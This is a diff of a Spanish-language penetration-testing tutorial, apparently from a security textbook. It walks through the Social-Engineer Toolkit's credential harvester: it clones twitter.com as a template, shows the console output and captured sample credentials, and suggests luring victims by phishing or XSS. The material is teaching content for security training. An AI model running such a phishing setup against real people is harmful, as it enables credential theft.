@@ -133,34 +133,81 @@ functionality.
 set:webattack>1
 ```
 
-**Paso 6** . En el menú que se muestra en el Ejemplo 7-5, ingrese la dirección IP del host que le gustaría usar para recopilar las credenciales del usuario (en este caso, **192.168.88.225** ). En este ejemplo, SET ha reconocido la dirección IP del sistema atacante. Si esto le ocurre a usted, puede simplemente presionar **Enter** para seleccionar la dirección IP del sistema atacante.
-
-_**Ejemplo 7-5**_  : Ingreso de la dirección IP del recolector de credenciales
-
-<pre><code><strong>                [-] Credential harvester will allow you to utilize the clonecapabilities within SET[-] to harvest credentials or parameters from a website as well asplace them into a report------------------------------------------------------------------------- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *IMPORTANT * --The way that this works is by cloning a site and looking for formfields to rewrite. If the POST fields are not usual methods forposting forms this could fail. If it does, you can always save theHTML, rewrite the forms to be standard forms and use the "IMPORT"feature. Additionally, really important:If you are using an EXTERNAL IP ADDRESS, you need to place theEXTERNAL IP address below, not your NAT address. Additionally, ifyou don't know basic networking concepts, and you have a privateIP address, you will need to do port forwarding to your NAT IPaddress from your external IP address. A browser doesn't know howto communicate with a private IP address, so if you don't specifyan external IP address if you are using this from an externalperspective, it will not work. This isn't a SET issue this is hownetworking works.set:webattack> IP address for the POST back in Harvester/Tabnabbing[192.168.88.225]:
-</strong></code></pre>
-
-**Paso 7** . Seleccione **3. Twitter** , como se muestra en el ejemplo 7-6.
-
-_**Ejemplo 7-6**_  : Selección de la plantilla para Twitter
-
-<pre><code><strong>                --------------------------------------------------------                 **** Important Information ****For templates, when a POST is initiated to harvestcredentials, you will need a site for it to redirect.You can configure this option under:      /etc/setoolkit/set.configEdit this file, and change HARVESTER_REDIRECT andHARVESTER_URL to the sites you want to redirect toafter it is posted. If you do not set these, thenit will not redirect properly. This only goes fortemplates.--------------------------------------------------------  1. Java Required  2. Google  3. Twitterset:webattack> Select a template:3[*] Cloning the website: http://www.twitter.com[*] This could take a little bit...The best way to use this attack is if username and password formfields are available. Regardless, this captures all POSTs on awebsite.[*] The Social-Engineer Toolkit Credential Harvester Attack[*] Credential Harvester is running on port 80[*] Information will be displayed to you as it arrives below:
-</strong>
-              
-</code></pre>
-
-Luego, puede redirigir a los usuarios a este sitio falso de Twitter enviando un correo electrónico de phishing o aprovechando vulnerabilidades web como secuencias de comandos entre sitios (XSS) y falsificación de solicitudes entre sitios (CSRF). La Figura 7-2 muestra la página de inicio de sesión falsa de Twitter, donde el usuario ingresa sus credenciales.
-
-_Página de inicio de sesión falsa_
-
-
-
-El ejemplo 7-7 muestra cómo el sistema atacante recopila las credenciales del usuario. El nombre de usuario ingresado es _santosomar_ y la contraseña es _superbadpassword_ . También puede ver el token de sesión.
-
-_**Ejemplo 7-7**_ _: Recopilación de credenciales de usuario_
+**Paso 6** . Ingrese la dirección IP del host que le gustaría usar para recopilar las credenciales del usuario.
 
 ```
-192.168.78.238 - - [28/Jun/2021 23:07:41] "GET / HTTP/1.1" 200 -[*] WE GOT A HIT! Printing the output:POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=santosomarPOSSIBLE PASSWORD FIELD FOUND: session[password]=superbadpasswordPARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52PARAM: scribe_log=POSSIBLE USERNAME FIELD FOUND: redirect_after_login=PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.192.168.78.238 - - [28/Jun/2021 23:08:27] "POST /sessions HTTP/1.1"302 - 
+[-] Credential harvester will allow you to utilize the clone
+capabilities within SET
+[-] to harvest credentials or parameters from a website as well as
+place them into a report
+-----------------------------------------------------------------------
+-- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *
+IMPORTANT * --
+The way that this works is by cloning a site and looking for form
+fields to rewrite. If the POST fields are not usual methods for
+posting forms this could fail. If it does, you can always save the
+HTML, rewrite the forms to be standard forms and use the "IMPORT"
+feature. Additionally, really important:
+If you are using an EXTERNAL IP ADDRESS, you need to place the
+EXTERNAL IP address below, not your NAT address. Additionally, if
+you don't know basic networking concepts, and you have a private
+IP address, you will need to do port forwarding to your NAT IP
+address from your external IP address. A browser doesn't know how
+to communicate with a private IP address, so if you don't specify
+an external IP address if you are using this from an external
+perspective, it will not work. This isn't a SET issue this is how
+networking works.
+set:webattack> IP address for the POST back in Harvester/Tabnabbing
+[192.168.88.225]:
+
+```
+
+**Paso 7** . Seleccione **Twitter** o cualquier plantilla objetivo.
+
+```
+--------------------------------------------------------
+                 **** Important Information ****
+For templates, when a POST is initiated to harvest
+credentials, you will need a site for it to redirect.
+You can configure this option under:
+      /etc/setoolkit/set.config
+Edit this file, and change HARVESTER_REDIRECT and
+HARVESTER_URL to the sites you want to redirect to
+after it is posted. If you do not set these, then
+it will not redirect properly. This only goes for
+templates.
+--------------------------------------------------------
+  1. Java Required
+  2. Google
+  3. Twitter
+set:webattack> Select a template:3
+[*] Cloning the website: http://www.twitter.com
+[*] This could take a little bit...
+The best way to use this attack is if username and password form
+fields are available. Regardless, this captures all POSTs on a
+website.
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:
+```
+
+Luego, puede redirigir a los usuarios a este sitio falso de Twitter enviando un correo electrónico de phishing o aprovechando vulnerabilidades web como secuencias de comandos entre sitios (XSS) y falsificación de solicitudes entre sitios (CSRF).
+
+_Recopilación de credenciales de usuario._
+
+```
+192.168.78.238 - - [28/Jun/2021 23:07:41] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=santosomar
+POSSIBLE PASSWORD FIELD FOUND: session[password]=superbadpassword
+PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
+PARAM: scribe_log=
+POSSIBLE USERNAME FIELD FOUND: redirect_after_login=
+PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+192.168.78.238 - - [28/Jun/2021 23:08:27] "POST /sessions HTTP/1.1"
+302 - 
+
 ```
 
 <mark style="color:red;">**Recursos**</mark>&#x20;
